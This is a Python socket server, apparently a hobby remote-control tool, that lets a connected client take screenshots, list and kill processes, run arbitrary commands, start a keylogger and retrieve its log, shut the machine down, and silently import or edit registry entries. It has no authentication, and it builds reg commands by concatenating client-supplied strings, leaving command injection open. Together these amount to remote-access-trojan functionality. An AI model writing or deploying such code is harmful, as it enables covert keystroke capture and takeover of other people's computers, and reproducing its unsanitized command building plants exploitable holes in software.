import sys
import socket
import threading
import time
from PIL import Image
import numpy as np
from ScreenShot import*
from RunningProccess import*
from KeyLogger import*
from ShutDown import*
from Registry import*
from tkinter import*
HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
# SERVER = "127.0.0.1"
ADDR= (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "DISCONNECT!"
TAKE_SCREEN_SHOT = "TAKE SCREENSHOT"
RUNNING_PROCESS ="CHECK RUNNING PROCESS"
RUNNING_APP ="CHECK RUNNING APP"
STOP_LISTING = "STOP"
START_LISTING = "START LISTING"
KILL_APP_VIA_PID = "KILL APP VIA PID"
KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
START_PROCESS = "START PROCESS"
KEYLOGGING ="KEY LOG"
STOP_KEYLOGGING = "STOP KEYLOGGING"
PRINT_KEYLOG = "PRINT KEYLOG"
SHUTDOWN = "SHUTDOWN"
CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"
SEND_FILE = "SEND FILE"
SEND_REG_FILE = "SEND REG FILE"
DELETE_KEY_VALUE = "DELETE REG VALUE"
GET_KEY_VALUE = "GET KEY VALUE"
ADD_NEW_KEY = "ADD NEW KEY"
DELETE_KEY = "DELETE KEY"
SET_KEY_VALUE ="SET KEY VALUE"


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def send1(conn,msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    conn.send(send_length)
    conn.send(message)

def recv1(conn):
    msg_length = conn.recv(HEADER).decode(FORMAT)
    if msg_length:
        msg_length = int(msg_length)
        msg = conn.recv(msg_length).decode(FORMAT)
        return msg
    return ""

def get_Size(fileobject):
    fileobject.seek(0,2) # move the cursor to the end of the file
    size = fileobject.tell()
    return size


def send_file1(conn,filename):
    file = open(filename,"rb")
    size = get_Size(file)
    
    file.close()
    send1(conn,str(size))
    t = size/2
    t = int(t)
    with open(filename,'rb') as fp:
        for i in range(t):
            data = fp.read(2)
            conn.send(data)








def handle_client(conn, addr):    
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            print(f"[{addr}] {msg}") 
            


            if msg == TAKE_SCREEN_SHOT:
                Take_Screenshot("ScreenShot.png")
                send_file1(conn,"ScreenShot.png")
                    



            elif msg == RUNNING_PROCESS:
                def execute():
                    list_proc = enum_running_process()
                    size = len(list_proc)
                    size = str(size)
                    if size =='0':
                        send1(conn,'No running app!')
                    else:
                        send1(conn,size)
                        for app in list_proc:
                            send1(conn,app[0])
                            send1(conn,app[1])
                            send1(conn,app[2])
                sidequest_thread = threading.Thread(target= execute)
                sidequest_thread.start()
                




            elif msg == KILL_PROCESS_VIA_PID:
                def execute():
                    pid = recv1(conn)
                    pid = int(pid)
                    process_killed = kill_process_by_id(pid)
                    send1(conn,str(process_killed))
                sidequest_thread = threading.Thread(target= execute)
                sidequest_thread.start()
                
            

        
                
            
            elif msg == START_PROCESS:
                proc = recv1(conn)
                def execute():
                    os.system(proc)
                sidequest_thread = threading.Thread(target= execute)
                sidequest_thread.start()

                
            elif msg == KEYLOGGING:
                def init_listener():
                    with Listener(on_press = getKey) as listener:
                        listener.join()
                sidequest_thread = threading.Thread(target= init_listener)
                sidequest_thread.start()
            
            elif msg == STOP_KEYLOGGING:
                for i in range(10):
                    Key_press(Key.f12)
                
            
            elif msg == PRINT_KEYLOG:
                try:
                    
                    with open("KeyLog.txt","r") as file:
                        key_log_string=file.read()
                        
                    send1(conn,key_log_string)
                    #Delete previous log
                    os.remove('KeyLog.txt')
                except FileNotFoundError:
                    send1(conn,"File not found")


            elif msg == SHUTDOWN:
                sec = 40
                send1(conn,f"Server shutdown in {sec} seconds")
                shutdown(sec)

            
                


            elif msg == SEND_REG_FILE:
                content = recv1(conn)
                filename = "C:\Client_Reg.reg"
                with open(filename,'w') as reg_file:
                    reg_file.write(content)
                os.system("regedit /s " + filename)
                

            elif msg == GET_KEY_VALUE:
                path = recv1(conn)
                value = recv1(conn)
                ans = get_registry_value(path,value)
                send1(conn,ans)

            elif msg == DELETE_KEY_VALUE:
                path = recv1(conn)
                print(path)
                value = recv1(conn)
                print(value)
                ans = os.system("reg delete "+path+" /v "+ value + " /f")
                send1(conn,str(ans))

            elif msg == ADD_NEW_KEY:
                path = recv1(conn)
                ans = os.system('reg add '+ path)
                send1(conn,str(ans))

            elif msg == DELETE_KEY:
                path = recv1(conn)
                ans = os.system('reg delete '+ path + ' /f')
                send1(conn,str(ans))

            
            elif msg == SET_KEY_VALUE:
                path = recv1(conn)
                value = recv1(conn)
                data = recv1(conn)
                data_type = recv1(conn)
                ans = os.system('reg add '+ path +' /v '+ value+ ' /t '+ data_type+ ' /d '+data+ ' /f')
                send1(conn,str(ans))


            elif msg == RUNNING_APP:
                def execute():
                    list_app = enum_running_app()
                    size = len(list_app)
                    if size > 0:
                        size = str(size)
                        send1(conn,size)
                        for app in list_app:
                            send1(conn,app[0])
                            send1(conn,app[1])
                            send1(conn,app[2])
                        
                    else:
                        send1(conn,"No running app!")
                sidequest_thread = threading.Thread(target= execute)
                sidequest_thread.start()
                
            


            elif msg == DISCONNECT_MESSAGE:
                connected = False
            
            else: pass
            time.sleep(0.500)
            
    conn.close()



    
    
def start():
    print("[STARTING] server is starting ...")
    server.listen()
    print(f"[LISTENING] Server is listening on {SERVER}")
    conn, addr = server.accept()
    handle_client(conn,addr)



Server_windows = Tk()
Server_windows.title("Open")
Server_windows.geometry("200x200")

OpenServer_button = Button(Server_windows, text = "Open Server", command= start)
OpenServer_button.place(x = 25, y =25, width = 150, height = 150)

Server_windows.mainloop()

    


